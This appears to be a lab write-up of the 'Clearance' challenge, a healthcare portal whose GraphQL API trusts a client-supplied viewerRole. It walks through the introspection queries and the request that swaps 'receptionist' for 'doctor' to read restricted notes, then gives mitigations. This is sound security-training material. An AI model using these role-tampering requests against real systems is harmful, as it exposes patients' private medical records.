---

title: "GraphQL Role Parameter Abuse Leads to Restricted Medical Note Disclosure | Clearance"
date: 2026-06-03 00:00:00 +0530
categories: [A01 - Broken Access Control, Privilege Escalation]
tags: [webverselabs-pro, graphql, broken-access-control, privilege-escalation, authorization-bypass, healthcare]
author: Shivansh Sharma
image:
path: /assets/images/posts/clearance-graphql-privilege-escalation.webp
alt: GraphQL Role Parameter Abuse Leads to Restricted Medical Note Disclosure
-----------------------------------------------------------------------------

## Lab Link

Lab: [Clearance](https://dashboard.webverselabs-pro.com/challenges/clearance)

---

## Overview

Clearance is a healthcare management portal used by medical staff to manage patient information and clinical records.

The application uses GraphQL for data retrieval and includes role-based restrictions intended to limit access to sensitive medical notes. Receptionists can view basic patient information, while physicians have access to restricted clinical records.

However, the backend exposes a user-controlled GraphQL parameter that determines which role should be used when rendering patient timeline data.

Because the server trusts the supplied role value instead of deriving permissions from the authenticated session, a receptionist can impersonate medical staff and access restricted patient notes.

---

## Objective

Access doctor-only patient timeline entries by abusing a GraphQL role parameter exposed to low-privileged users.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Privilege Escalation
    └── Client-Controlled Authorization
        └── GraphQL Role Parameter Abuse
```

---

## Reconnaissance

Opening the application reveals a healthcare portal named **CliniCore**.

The interface references several staff roles:

* Receptionist
* Nurse
* Physician

A banner also displays:

```text
Doctor clearance required
```

This suggests that access to certain resources depends on user roles.

---

## Account Registration

Create a new account through the registration functionality.

After signup, the application automatically authenticates the user.

A request to `/api/me` reveals the assigned role.

### Request

```http
GET /api/me HTTP/2
Host: c51803e6-4065-clearance-4c52e.challenges.webverselabs-pro.com
Cookie: connect.sid=REDACTED
```

### Response

```json
{
  "id": 3,
  "name": "kelvin",
  "email": "kelvin@kel.com",
  "role": "receptionist",
  "staff_id": "RC-1023"
}
```

The account receives the default role:

```text
receptionist
```

---

## Discovering the GraphQL Endpoint

While browsing patient information, a GraphQL request appears in Burp Suite.

### Request

```http
POST /graphql HTTP/2
Content-Type: application/json

{
  "query":"query SP($search: String) { patients(search: $search) { id name dob department } }",
  "variables":{
    "search":""
  }
}
```

The application clearly relies on GraphQL for patient data access.

---

## GraphQL Introspection

GraphQL introspection is enabled.

### Enumerating Available Queries

```json
{
  "query":"{ __schema { queryType { fields { name } } } }"
}
```

### Response

```json
{
  "data":{
    "__schema":{
      "queryType":{
        "fields":[
          {
            "name":"patients"
          },
          {
            "name":"patientTimeline"
          },
          {
            "name":"me"
          }
        ]
      }
    }
  }
}
```

One query immediately stands out:

```graphql
patientTimeline
```

---

## Enumerating Query Arguments

Next, inspect the query arguments.

### Request

```json
{
  "query":"{__type(name:\"Query\"){fields{name args{name type{name kind ofType{name kind}}}}}}"
}
```

### Response

```json
{
  "data":{
    "__type":{
      "fields":[
        {
          "name":"patients",
          "args":[
            {
              "name":"search"
            }
          ]
        },
        {
          "name":"patientTimeline",
          "args":[
            {
              "name":"patientId"
            },
            {
              "name":"viewerRole"
            }
          ]
        }
      ]
    }
  }
}
```

The critical discovery is:

```graphql
viewerRole
```

A role parameter supplied by the client is often a strong indicator of authorization weaknesses.

---

## Capturing a Legitimate Request

Viewing a patient timeline generates the following request:

```json
{
  "query":"query GT($patientId: ID!, $viewerRole: String!) { patientTimeline(patientId: $patientId, viewerRole: $viewerRole) { patient { id name dob department } entries { id date type note restricted } }}",
  "variables":{
    "patientId":"3",
    "viewerRole":"receptionist"
  }
}
```

The application is explicitly sending the user's role to the server.

Authorization decisions should never depend on client-controlled role values.

---

## Exploitation

The server appears to trust the supplied role parameter.

The original request contains:

```json
{
  "viewerRole":"receptionist"
}
```

Replace it with:

```json
{
  "viewerRole":"doctor"
}
```

### Modified Request

```json
{
  "query":"query GT($patientId: ID!, $viewerRole: String!) { patientTimeline(patientId: $patientId, viewerRole: $viewerRole) { patient { id name dob department } entries { id date type note restricted } }}",
  "variables":{
    "patientId":"3",
    "viewerRole":"doctor"
  }
}
```

---

## Successful Privilege Escalation

The server processes the request using the attacker-supplied role.

### Response

```json
{
  "data":{
    "patientTimeline":{
      "patient":{
        "id":"3",
        "name":"Hendricks, J.",
        "dob":"1988-11-05",
        "department":"Neurology"
      },
      "entries":[
        {
          "id":"8",
          "date":"2025-03-11",
          "type":"Specialist Note",
          "note":"WEBVERSE{417000493a23030d03781e023d4c225a}",
          "restricted":true
        }
      ]
    }
  }
}
```

The receptionist account successfully accesses physician-only medical notes.

---

## Flag

```text
WEBVERSE{417000493a23030d03781e023d4c225a}
```

---

## Root Cause Analysis

The backend trusts a client-controlled authorization parameter:

```graphql
viewerRole
```

instead of enforcing permissions based on the authenticated session.

The vulnerable design effectively performs:

```javascript
getTimeline(patientId, viewerRole);
```

where:

```text
viewerRole
```

is supplied by the attacker.

As a result, low-privileged users can impersonate higher-privileged roles simply by modifying a GraphQL variable.

---

## Impact

An attacker can:

* Access restricted patient notes
* View sensitive medical information
* Bypass role-based access controls
* Escalate privileges
* Access records intended only for medical staff

In a real healthcare environment this could lead to:

* HIPAA violations
* Patient privacy breaches
* Unauthorized disclosure of clinical records
* Regulatory penalties

---

## Mitigation

### Derive Roles Server-Side

Never trust role values supplied by clients.

### Vulnerable Design

```javascript
getTimeline(patientId, viewerRole);
```

### Secure Design

```javascript
getTimeline(patientId, req.user.role);
```

### Implement Field-Level Authorization

Every sensitive GraphQL resolver should verify permissions before returning data.

### Remove Authorization Parameters

Clients should never control:

```text
role
permissions
access_level
is_admin
```

values.

### Restrict GraphQL Introspection

Disable schema introspection in production environments whenever possible.

### Enforce Centralized RBAC

Authorization decisions should be derived exclusively from trusted session data.

---

## Real-World Insight

Authorization flaws in GraphQL APIs frequently arise when developers expose internal helper parameters intended for preview tools, administrative interfaces, or debugging functionality.

Because GraphQL encourages flexible data retrieval, a single authorization mistake can expose large volumes of sensitive information.

The Clearance challenge demonstrates a critical security principle:

**Roles and permissions must always be enforced by the server. If the client can choose its own role, the client controls authorization.**
